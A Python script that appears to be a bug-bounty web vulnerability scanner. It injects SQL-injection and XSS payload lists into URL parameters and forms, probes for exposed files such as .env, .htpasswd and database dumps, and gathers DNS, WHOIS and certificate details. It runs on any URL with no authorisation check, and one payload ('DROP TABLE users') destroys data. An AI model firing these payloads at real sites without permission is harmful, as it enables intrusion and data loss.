#!/usr/bin/env python3
"""
Security Testing Modules for Bounty Hunter Application
Advanced vulnerability detection and information gathering toolkit
"""

import requests
import re
import urllib.parse
import socket
import ssl
import json
import time
import threading
from urllib.robotparser import RobotFileParser
from bs4 import BeautifulSoup
import dns.resolver
import whois
from concurrent.futures import ThreadPoolExecutor, as_completed

class SecurityScanner:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        })
        self.vulnerabilities = []
        self.info_gathered = {}
        
    def validate_url(self, url):
        """Validate and normalize URL"""
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
        try:
            response = requests.head(url, timeout=10)
            return url
        except:
            try:
                url = url.replace('https://', 'http://')
                response = requests.head(url, timeout=10)
                return url
            except:
                return None

class SQLInjectionTester:
    def __init__(self, scanner):
        self.scanner = scanner
        self.payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "' UNION SELECT NULL--",
            "'; DROP TABLE users--",
            "' OR 'x'='x",
            "1' OR '1'='1' --",
            "admin'--",
            "admin' #",
            "admin'/*",
            "' or 1=1#",
            "' or 1=1--",
            "' or 1=1/*",
            "') or '1'='1--",
            "') or ('1'='1--",
            "1' and '1'='1",
            "1' and '1'='2",
            "' UNION SELECT 1,2,3--",
            "' UNION ALL SELECT NULL,NULL,NULL--"
        ]
        
    def test_sql_injection(self, url):
        """Test for SQL injection vulnerabilities"""
        vulnerabilities = []
        
        try:
            # Get original response
            original_response = self.scanner.session.get(url, timeout=10)
            original_length = len(original_response.content)
            
            for payload in self.payloads:
                test_urls = []
                
                # Test GET parameters
                parsed_url = urllib.parse.urlparse(url)
                if parsed_url.query:
                    params = urllib.parse.parse_qs(parsed_url.query)
                    for param in params:
                        modified_params = params.copy()
                        modified_params[param] = [payload]
                        new_query = urllib.parse.urlencode(modified_params, doseq=True)
                        test_url = urllib.parse.urlunparse((
                            parsed_url.scheme, parsed_url.netloc, parsed_url.path,
                            parsed_url.params, new_query, parsed_url.fragment
                        ))
                        test_urls.append((test_url, f"GET parameter: {param}"))
                
                # Test each URL
                for test_url, location in test_urls:
                    try:
                        response = self.scanner.session.get(test_url, timeout=10)
                        
                        # Check for SQL error messages
                        error_patterns = [
                            r"SQL syntax.*MySQL",
                            r"Warning.*mysql_.*",
                            r"valid MySQL result",
                            r"MySqlClient\.",
                            r"PostgreSQL.*ERROR",
                            r"Warning.*pg_.*",
                            r"valid PostgreSQL result",
                            r"Npgsql\.",
                            r"Driver.*SQL.*Server",
                            r"OLE DB.*SQL Server",
                            r"SQLServer JDBC Driver",
                            r"SqlException",
                            r"Oracle error",
                            r"Oracle.*Driver",
                            r"Warning.*oci_.*",
                            r"Warning.*ora_.*"
                        ]
                        
                        for pattern in error_patterns:
                            if re.search(pattern, response.text, re.IGNORECASE):
                                vulnerabilities.append({
                                    'type': 'SQL Injection',
                                    'severity': 'High',
                                    'location': location,
                                    'payload': payload,
                                    'url': test_url,
                                    'evidence': f"SQL error pattern detected: {pattern}"
                                })
                                break
                        
                        # Check for significant response differences
                        if abs(len(response.content) - original_length) > 1000:
                            vulnerabilities.append({
                                'type': 'SQL Injection (Response Difference)',
                                'severity': 'Medium',
                                'location': location,
                                'payload': payload,
                                'url': test_url,
                                'evidence': f"Response length changed significantly: {original_length} -> {len(response.content)}"
                            })
                            
                    except Exception as e:
                        continue
                        
        except Exception as e:
            pass
            
        return vulnerabilities

class XSSTester:
    def __init__(self, scanner):
        self.scanner = scanner
        self.payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<keygen onfocus=alert('XSS') autofocus>",
            "<video><source onerror=alert('XSS')>",
            "<audio src=x onerror=alert('XSS')>",
            "<details open ontoggle=alert('XSS')>",
            "<marquee onstart=alert('XSS')>",
            "'\"><script>alert('XSS')</script>",
            "\"><img src=x onerror=alert('XSS')>",
            "';alert('XSS');//",
            "\";alert('XSS');//"
        ]
        
    def test_xss(self, url):
        """Test for Cross-Site Scripting vulnerabilities"""
        vulnerabilities = []
        
        try:
            # Test reflected XSS in URL parameters
            parsed_url = urllib.parse.urlparse(url)
            if parsed_url.query:
                params = urllib.parse.parse_qs(parsed_url.query)
                
                for payload in self.payloads:
                    for param in params:
                        modified_params = params.copy()
                        modified_params[param] = [payload]
                        new_query = urllib.parse.urlencode(modified_params, doseq=True)
                        test_url = urllib.parse.urlunparse((
                            parsed_url.scheme, parsed_url.netloc, parsed_url.path,
                            parsed_url.params, new_query, parsed_url.fragment
                        ))
                        
                        try:
                            response = self.scanner.session.get(test_url, timeout=10)
                            
                            # Check if payload is reflected in response
                            if payload in response.text:
                                vulnerabilities.append({
                                    'type': 'Reflected XSS',
                                    'severity': 'High',
                                    'location': f"GET parameter: {param}",
                                    'payload': payload,
                                    'url': test_url,
                                    'evidence': f"Payload reflected in response"
                                })
                                
                        except Exception as e:
                            continue
                            
            # Test for forms and POST-based XSS
            try:
                response = self.scanner.session.get(url, timeout=10)
                soup = BeautifulSoup(response.content, 'html.parser')
                forms = soup.find_all('form')
                
                for form in forms:
                    action = form.get('action', url)
                    method = form.get('method', 'GET').upper()
                    
                    if not action.startswith('http'):
                        action = urllib.parse.urljoin(url, action)
                    
                    inputs = form.find_all(['input', 'textarea', 'select'])
                    form_data = {}
                    
                    for input_elem in inputs:
                        name = input_elem.get('name')
                        if name and input_elem.get('type') != 'submit':
                            form_data[name] = "<script>alert('XSS')</script>"
                    
                    if form_data:
                        try:
                            if method == 'POST':
                                test_response = self.scanner.session.post(action, data=form_data, timeout=10)
                            else:
                                test_response = self.scanner.session.get(action, params=form_data, timeout=10)
                            
                            if "<script>alert('XSS')</script>" in test_response.text:
                                vulnerabilities.append({
                                    'type': 'Form-based XSS',
                                    'severity': 'High',
                                    'location': f"Form at {action}",
                                    'payload': "<script>alert('XSS')</script>",
                                    'url': action,
                                    'evidence': f"XSS payload reflected in form response"
                                })
                                
                        except Exception as e:
                            continue
                            
            except Exception as e:
                pass
                
        except Exception as e:
            pass
            
        return vulnerabilities

class DirectoryEnumerator:
    def __init__(self, scanner):
        self.scanner = scanner
        self.common_dirs = [
            'admin', 'administrator', 'login', 'wp-admin', 'wp-login',
            'phpmyadmin', 'cpanel', 'webmail', 'mail', 'email',
            'user', 'users', 'member', 'members', 'account', 'accounts',
            'backup', 'backups', 'bak', 'old', 'temp', 'tmp',
            'test', 'testing', 'dev', 'development', 'staging',
            'api', 'v1', 'v2', 'rest', 'service', 'services',
            'config', 'configuration', 'settings', 'setup',
            'upload', 'uploads', 'files', 'file', 'download', 'downloads',
            'images', 'img', 'pics', 'pictures', 'photos',
            'css', 'js', 'javascript', 'scripts', 'style', 'styles',
            'includes', 'inc', 'lib', 'library', 'libraries',
            'docs', 'documentation', 'help', 'support',
            'blog', 'news', 'press', 'media',
            'shop', 'store', 'cart', 'checkout', 'payment',
            'search', 'find', 'results',
            'contact', 'about', 'info', 'information'
        ]
        
        self.common_files = [
            'robots.txt', 'sitemap.xml', 'sitemap.txt',
            'crossdomain.xml', 'clientaccesspolicy.xml',
            '.htaccess', '.htpasswd', 'web.config',
            'config.php', 'config.inc.php', 'configuration.php',
            'settings.php', 'wp-config.php', 'database.php',
            'readme.txt', 'readme.html', 'README.md',
            'changelog.txt', 'CHANGELOG.md', 'version.txt',
            'phpinfo.php', 'info.php', 'test.php',
            'backup.sql', 'database.sql', 'dump.sql',
            'error_log', 'access_log', 'error.log', 'access.log',
            '.env', '.env.local', '.env.production',
            'package.json', 'composer.json', 'requirements.txt'
        ]
        
    def enumerate_directories(self, base_url):
        """Enumerate directories and files"""
        found_items = []
        
        def check_path(path):
            url = urllib.parse.urljoin(base_url, path)
            try:
                response = self.scanner.session.head(url, timeout=5)
                if response.status_code == 200:
                    return {
                        'type': 'Directory' if path.endswith('/') else 'File',
                        'url': url,
                        'status_code': response.status_code,
                        'size': response.headers.get('content-length', 'Unknown')
                    }
            except:
                pass
            return None
        
        # Check directories
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = []
            
            for directory in self.common_dirs:
                futures.append(executor.submit(check_path, directory + '/'))
                
            for file in self.common_files:
                futures.append(executor.submit(check_path, file))
            
            for future in as_completed(futures):
                result = future.result()
                if result:
                    found_items.append(result)
        
        return found_items

class InformationGatherer:
    def __init__(self, scanner):
        self.scanner = scanner
        
    def gather_info(self, url):
        """Gather comprehensive information about the target"""
        info = {}
        
        try:
            # Parse URL
            parsed_url = urllib.parse.urlparse(url)
            domain = parsed_url.netloc
            
            # Basic HTTP info
            response = self.scanner.session.get(url, timeout=10)
            info['http_status'] = response.status_code
            info['headers'] = dict(response.headers)
            info['server'] = response.headers.get('Server', 'Unknown')
            info['powered_by'] = response.headers.get('X-Powered-By', 'Unknown')
            
            # Technology detection
            info['technologies'] = self.detect_technologies(response)
            
            # SSL/TLS info
            if parsed_url.scheme == 'https':
                info['ssl_info'] = self.get_ssl_info(domain)
            
            # DNS info
            info['dns_info'] = self.get_dns_info(domain)
            
            # WHOIS info
            try:
                whois_info = whois.whois(domain)
                info['whois'] = {
                    'registrar': whois_info.registrar,
                    'creation_date': str(whois_info.creation_date),
                    'expiration_date': str(whois_info.expiration_date),
                    'name_servers': whois_info.name_servers
                }
            except:
                info['whois'] = 'Unable to retrieve WHOIS information'
            
            # Robots.txt
            try:
                robots_url = urllib.parse.urljoin(url, '/robots.txt')
                robots_response = self.scanner.session.get(robots_url, timeout=5)
                if robots_response.status_code == 200:
                    info['robots_txt'] = robots_response.text
            except:
                info['robots_txt'] = 'No robots.txt found'
            
            # Sitemap
            try:
                sitemap_url = urllib.parse.urljoin(url, '/sitemap.xml')
                sitemap_response = self.scanner.session.get(sitemap_url, timeout=5)
                if sitemap_response.status_code == 200:
                    info['sitemap'] = 'Sitemap found'
                else:
                    info['sitemap'] = 'No sitemap found'
            except:
                info['sitemap'] = 'No sitemap found'
                
        except Exception as e:
            info['error'] = str(e)
            
        return info
    
    def detect_technologies(self, response):
        """Detect web technologies"""
        technologies = []
        
        # Check headers
        server = response.headers.get('Server', '').lower()
        powered_by = response.headers.get('X-Powered-By', '').lower()
        
        if 'apache' in server:
            technologies.append('Apache')
        if 'nginx' in server:
            technologies.append('Nginx')
        if 'iis' in server:
            technologies.append('IIS')
        if 'php' in powered_by:
            technologies.append('PHP')
        if 'asp.net' in powered_by:
            technologies.append('ASP.NET')
        
        # Check content
        content = response.text.lower()
        
        if 'wordpress' in content or 'wp-content' in content:
            technologies.append('WordPress')
        if 'joomla' in content:
            technologies.append('Joomla')
        if 'drupal' in content:
            technologies.append('Drupal')
        if 'jquery' in content:
            technologies.append('jQuery')
        if 'bootstrap' in content:
            technologies.append('Bootstrap')
        if 'react' in content:
            technologies.append('React')
        if 'angular' in content:
            technologies.append('Angular')
        if 'vue' in content:
            technologies.append('Vue.js')
        
        return technologies
    
    def get_ssl_info(self, domain):
        """Get SSL certificate information"""
        try:
            context = ssl.create_default_context()
            with socket.create_connection((domain, 443), timeout=10) as sock:
                with context.wrap_socket(sock, server_hostname=domain) as ssock:
                    cert = ssock.getpeercert()
                    return {
                        'subject': dict(x[0] for x in cert['subject']),
                        'issuer': dict(x[0] for x in cert['issuer']),
                        'version': cert['version'],
                        'serial_number': cert['serialNumber'],
                        'not_before': cert['notBefore'],
                        'not_after': cert['notAfter']
                    }
        except:
            return 'Unable to retrieve SSL information'
    
    def get_dns_info(self, domain):
        """Get DNS information"""
        dns_info = {}
        
        try:
            # A records
            a_records = dns.resolver.resolve(domain, 'A')
            dns_info['A'] = [str(record) for record in a_records]
        except:
            dns_info['A'] = []
        
        try:
            # MX records
            mx_records = dns.resolver.resolve(domain, 'MX')
            dns_info['MX'] = [str(record) for record in mx_records]
        except:
            dns_info['MX'] = []
        
        try:
            # NS records
            ns_records = dns.resolver.resolve(domain, 'NS')
            dns_info['NS'] = [str(record) for record in ns_records]
        except:
            dns_info['NS'] = []
        
        try:
            # TXT records
            txt_records = dns.resolver.resolve(domain, 'TXT')
            dns_info['TXT'] = [str(record) for record in txt_records]
        except:
            dns_info['TXT'] = []
        
        return dns_info

class VulnerabilityScanner:
    def __init__(self):
        self.scanner = SecurityScanner()
        self.sql_tester = SQLInjectionTester(self.scanner)
        self.xss_tester = XSSTester(self.scanner)
        self.dir_enum = DirectoryEnumerator(self.scanner)
        self.info_gatherer = InformationGatherer(self.scanner)
        
    def full_scan(self, url, progress_callback=None):
        """Perform a comprehensive security scan"""
        results = {
            'url': url,
            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
            'vulnerabilities': [],
            'information': {},
            'directories': [],
            'scan_status': 'In Progress'
        }
        
        try:
            # Validate URL
            if progress_callback:
                progress_callback("Validating URL...")
            
            validated_url = self.scanner.validate_url(url)
            if not validated_url:
                results['scan_status'] = 'Failed - Invalid URL'
                return results
            
            results['url'] = validated_url
            
            # Information gathering
            if progress_callback:
                progress_callback("Gathering information...")
            
            results['information'] = self.info_gatherer.gather_info(validated_url)
            
            # Directory enumeration
            if progress_callback:
                progress_callback("Enumerating directories...")
            
            results['directories'] = self.dir_enum.enumerate_directories(validated_url)
            
            # SQL injection testing
            if progress_callback:
                progress_callback("Testing for SQL injection...")
            
            sql_vulns = self.sql_tester.test_sql_injection(validated_url)
            results['vulnerabilities'].extend(sql_vulns)
            
            # XSS testing
            if progress_callback:
                progress_callback("Testing for XSS...")
            
            xss_vulns = self.xss_tester.test_xss(validated_url)
            results['vulnerabilities'].extend(xss_vulns)
            
            results['scan_status'] = 'Completed'
            
        except Exception as e:
            results['scan_status'] = f'Error: {str(e)}'
        
        if progress_callback:
            progress_callback("Scan completed!")
        
        return results

if __name__ == "__main__":
    # Test the scanner
    scanner = VulnerabilityScanner()
    
    def progress_update(message):
        print(f"[PROGRESS] {message}")
    
    # Example usage
    test_url = "https://httpbin.org"
    results = scanner.full_scan(test_url, progress_update)
    
    print(json.dumps(results, indent=2))

